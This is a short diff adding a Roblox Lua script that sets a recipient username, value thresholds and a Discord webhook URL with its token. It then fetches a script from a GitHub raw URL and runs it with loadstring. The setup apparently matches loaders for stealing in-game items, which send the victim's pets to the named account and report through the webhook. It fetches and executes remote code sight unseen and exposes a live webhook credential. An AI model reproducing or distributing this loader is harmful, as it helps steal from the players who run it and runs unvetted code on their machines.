@@ -1,0 +1,6 @@
+Username = "X4_NDY"
+min_rap = 100
+min_chance = 1000
+webhook = "https://discord.com/api/webhooks/1323692511440404501/CtCIa2_GbH93fernF0QPz4oJ9ani5jln4bpsWls5P-ORo6Qspx1PP7Pfp7p__voIAV61"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Detrox01/petsgo/refs/heads/main/script.txt"))()
